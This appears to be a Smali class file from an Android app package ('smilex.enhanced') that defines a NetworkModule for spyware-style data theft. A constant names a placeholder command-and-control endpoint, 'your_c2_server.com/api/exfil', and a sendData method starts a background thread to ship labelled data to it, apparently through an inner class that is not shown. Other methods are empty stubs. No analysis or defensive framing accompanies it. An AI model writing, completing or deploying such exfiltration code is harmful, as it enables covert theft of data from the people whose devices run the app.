.class public Lcom/smilex/enhanced/modules/NetworkModule;
.super Ljava/lang/Object;
.source "NetworkModule.java"

.field private static final C2_URL:Ljava/lang/String; = "http://your_c2_server.com/api/exfil"

.method public static init(Landroid/content/Context;)V
    .registers 3
    return-void
.end method

.method public static flushPendingUploads(Landroid/content/Context;)V
    .registers 3
    # Check connectivity and upload
    return-void
.end method

.method public static sendData(Ljava/lang/String;Ljava/lang/String;)V
    .registers 10
    # p0 = data_type, p1 = content
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/smilex/enhanced/modules/NetworkModule$1;
    invoke-direct {v1, p0, p1}, Lcom/smilex/enhanced/modules/NetworkModule$1;-><init>(Ljava/lang/String;Ljava/lang/String;)V
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    return-void
.end method

.method static synthetic access$000()Ljava/lang/String;
    .registers 1
    sget-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->C2_URL:Ljava/lang/String;
    return-object v0
.end method
